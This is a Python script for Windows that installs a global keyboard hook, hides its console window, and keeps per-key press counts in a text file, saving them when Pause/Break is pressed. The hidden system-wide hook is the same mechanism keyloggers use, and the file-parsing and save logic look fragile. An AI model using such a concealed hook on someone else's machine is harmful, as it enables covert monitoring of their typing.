import win32api
import win32console
import win32gui
import pythoncom, pyWinhook

print("Script Start..")

keyMap = {
    "Backspace": 8,
    "Tab": 9,
    "Enter": 13,
    "Shift": 16,
    "LeftShift": 160,
    "RightShift": 161,
    "Ctrl": 17,
    "LeftCtrl": 162,
    "RightCtrl": 163,
    "Alt": 164,
    "Pause/Break": 19,
    "CapsLock": 20,
    "Esc": 27,
    "Space": 32,
    "PageUp": 33,
    "PageDown": 34,
    "End": 35,
    "Home": 36,
    "ArrowLeft": 37,
    "ArrowUp": 38,
    "ArrowRight": 39,
    "ArrowDown": 40,
    "Insert": 45,
    "Delete": 46,
    "0": 48,
    "1": 49,
    "2": 50,
    "3": 51,
    "4": 52,
    "5": 53,
    "6": 54,
    "7": 55,
    "8": 56,
    "9": 57,
    "a": 65,
    "b": 66,
    "c": 67,
    "d": 68,
    "e": 69,
    "f": 70,
    "g": 71,
    "h": 72,
    "i": 73,
    "j": 74,
    "k": 75,
    "l": 76,
    "m": 77,
    "n": 78,
    "o": 79,
    "p": 80,
    "q": 81,
    "r": 82,
    "s": 83,
    "t": 84,
    "u": 85,
    "v": 86,
    "w": 87,
    "x": 88,
    "y": 89,
    "z": 90,
    "Windows": 91,
    "F1": 112,
    "F2": 113,
    "F3": 114,
    "F4": 115,
    "F5": 116,
    "F6": 117,
    "F7": 118,
    "F8": 119,
    "F9": 120,
    "F10": 121,
    "F11": 122,
    "F12": 123,
    "F13": 124,
    "NumLock": 144,
    "ScrollLock": 145,
    "VolumeDown": 174,
    "VolumeUp": 175,
    ";": 186,
    "=": 187,
    ",": 188,
    ".": 190,
    "/": 191,
    "`": 192,
    "[": 219,
    "\\": 220,
    "]": 221,
    "'": 222
}

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Store the counter for every key in a list, and we access each counts with its respective KeyID
keyCounts = [0] * 250

filename = "keystroke_record.txt"

# Retrieve the past key count data that was stored in the text
# Skip the first 10 elements in the list since they are just the title text
f = open(filename, "r")
buffer = f.read()
words = buffer.replace("\n", " ").split(" ")
words = words[10:]
f.close()

# Convert the Key from English into Key ID
index = 0
while (index < len(words)):
    words[index] = keyMap.get((words[index])[:-1])
    index += 2

# Retrieve the historical data from the file into the keyCount list
index = 0
while (index < len(words) - 1):
    keyCounts[words[index]] = int(words[index + 1])
    index += 2

def onKeyboardEvent(event):
    # Increment the counter at the KeyID index
    keyCounts[event.KeyID] += 1
    
    # Stop the Script and save the data into the file If we press the Pause/Break key 
    if (event.KeyID == 19):
        print("..Finished")
        resultStr = "Total keypress count(No space at the end of each line):\n"      
        index = 0
        for key in keyMap:
            resultStr += key + ": " + str(keyCounts[words[index]]) + "\n"
            index += 2

        resultStr = resultStr[:-1]

        file = open(filename, "w")
        file.write(resultStr)
        file.close()
        
    return True

# create a hook manager object
hm = pyWinhook.HookManager()
hm.KeyDown = onKeyboardEvent

# set the hook
hm.HookKeyboard()

# wait forever
pythoncom.PumpMessages()
